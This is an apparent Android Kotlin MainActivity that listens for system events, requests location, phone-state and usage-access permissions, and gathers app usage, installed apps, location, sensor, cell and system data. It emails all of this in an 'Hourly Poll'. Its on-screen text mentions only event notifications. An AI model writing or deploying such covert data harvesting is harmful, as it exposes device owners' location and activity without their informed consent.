package com.example.datatrackerapp

import android.Manifest
import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import com.example.datatrackerapp.ui.theme.DatatrackerappTheme
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : ComponentActivity() {

    private lateinit var dataCollector: DeviceDataCollector
    private lateinit var systemEventReceiver: SystemEventReceiver
    private val scope = CoroutineScope(Dispatchers.IO)
    private var isReceiverRegistered = false
    private val requestPermissionLauncher: ActivityResultLauncher<Array<String>> =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            // This block is called when the user responds to the permission dialog.
            if (permissions.values.all { it }) {
                // All permissions were granted.
                collectAndEmailData()
            } else {
                // One or more permissions were denied.
                println("One or more permissions were denied.")
                val deniedPermissions = permissions.filter { !it.value }.keys
                Log.w("Permissions", "Denied permissions: $deniedPermissions")
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // BroadcastReceiver stuff:
        val systemEventReceiver = SystemEventReceiver()
        val filter = IntentFilter()
        filter.addAction(Intent.ACTION_SCREEN_ON)
        filter.addAction(Intent.ACTION_SCREEN_OFF)
        filter.addAction(Intent.ACTION_USER_PRESENT)
        filter.addAction(Intent.ACTION_BOOT_COMPLETED)
        filter.addAction(Intent.ACTION_BATTERY_LOW)
        filter.addAction(Intent.ACTION_BATTERY_CHANGED)
        filter.addAction(Intent.ACTION_PACKAGE_ADDED)
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED)
        ContextCompat.registerReceiver(
            this,
            systemEventReceiver,
            filter,
            ContextCompat.RECEIVER_NOT_EXPORTED
        )
        isReceiverRegistered = true

        // Hourly Poll:
        dataCollector = DeviceDataCollector(this)
        checkPermissionsAndCollectData()

        enableEdgeToEdge()
        setContent {
            DatatrackerappTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Text(
                        text = "Device Event Monitor is active.\n\nThis app listens for system events in the background and sends email notifications.\n\nClose this screen; the monitoring will continue.",
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Cancel the coroutine scope when the activity is destroyed
        scope.cancel()
        // Unregister the SystemEventReceiver
        if (isReceiverRegistered) {
            try {
                unregisterReceiver(systemEventReceiver)
                isReceiverRegistered = false
                Log.d("MainActivity", "SystemEventReceiver unregistered.")
            } catch (e: IllegalArgumentException) {
                Log.w("MainActivity", "SystemEventReceiver was not registered or already unregistered: ${e.message}")
            }
        }
    }


    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            packageName
        )
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun checkPermissionsAndCollectData() {
        println("1")
        if (!hasUsageStatsPermission()) {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        }

        val requiredPermissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        )

        // Check which permissions are already granted.
        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isEmpty()) {
            collectAndEmailData()
        } else {
            println("here")
            requestPermissionLauncher.launch(permissionsToRequest)
        }
    }

    private fun collectAndEmailData() {
        val allData = StringBuilder()
        println("4")
        // Use the dataCollector instance to get the information
        val usageStats = dataCollector.getUsageStats()
        val installedApps = dataCollector.getInstalledApps()
        val sensorData = dataCollector.getSensorData()
        val cellInfo = dataCollector.getCellInfo()
        val systemInfo = dataCollector.getSystemInfo()

        // Location is asynchronous, so we handle it with a callback
        dataCollector.getCurrentLocation { locationInfo ->
            allData.append(usageStats)
                .append("\n").append(installedApps)
                .append("\n").append(locationInfo)
                .append("\n").append(sensorData)
                .append("\n").append(cellInfo)
                .append("\n").append(systemInfo)

            val time = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val emailSender = EmailSender()
            scope.launch {
                println("5")
                emailSender.sendEmail("Hourly Poll - $time", allData.toString())
            }
        }
    }

}